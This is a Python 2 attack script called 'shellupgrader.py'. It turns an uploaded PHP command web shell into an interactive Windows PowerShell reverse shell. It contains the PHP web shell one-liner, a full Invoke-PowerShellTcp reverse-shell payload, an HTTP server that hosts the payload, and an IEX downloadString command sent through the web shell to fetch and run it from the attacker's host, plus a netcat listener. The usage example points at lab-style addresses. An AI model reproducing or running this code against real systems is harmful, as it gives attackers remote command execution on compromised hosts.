#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#       __       ____                           __                                                          #
#  ___ / /  ___ / / /_ _____  ___ ________ ____/ /__ ____                                                   #
# (_-</ _ \/ -_) / / // / _ \/ _ `/ __/ _ `/ _  / -_) __/                                                   #
#/___/_//_/\__/_/_/\_,_/ .__/\_, /_/  \_,_/\_,_/\__/_/                                                      #
#                     /_/   /___/                                                                           #
# shellupgrader.py - nighter                                                                                #
#                                                                                                           #
# DATE                                                                                                      #
# 01/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# This gives you a proper shell if you first have staged with php code.                                     #
# It is often easier to upload bellow code snippet but you want a more proper shell                         #
# <?php echo system($_REQUEST['cmd']); ?>                                                                   #
# Rewritten to work on windows                                                                              #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import requests
import signal
import os
import sys
import time
import SimpleHTTPServer
import SocketServer
import urllib as ul;

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def build_windows_payload():

    payload = '''function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )

    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
'''
    payload += '''Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s''' % (LHOST, LPORT)

    with open('/tmp/shell.ps1', 'w') as f:
        f.write(payload)

def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()


def exploit():

    time.sleep(3)
    cmd = '''powershell "IEX(New-Object Net.WebClient).downloadString("""http://%s:8000/shell.ps1""")"''' % LHOST
    payload = ul.quote_plus(cmd)
    requests.get(URL + '?cmd=%s' % payload)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
       __       ____                           __       
  ___ / /  ___ / / /_ _____  ___ ________ ____/ /__ ____
 (_-</ _ \/ -_) / / // / _ \/ _ `/ __/ _ `/ _  / -_) __/
/___/_//_/\__/_/_/\_,_/ .__/\_, /_/  \_,_/\_,_/\__/_/   
                     /_/   /___/      
[windows powershell version] [nighter@nighter.se]
    """)
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        print "\nEXAMPLE: ./shellupgrader_win.py 'http://10.10.10.70:8080/php/fileManager/collectives/DG0/upload/cmd.php' 10.10.14.24 1337\n"
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    build_windows_payload()

    # Serve payload
    p = Process(target=HttpListener)
    p.start()

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)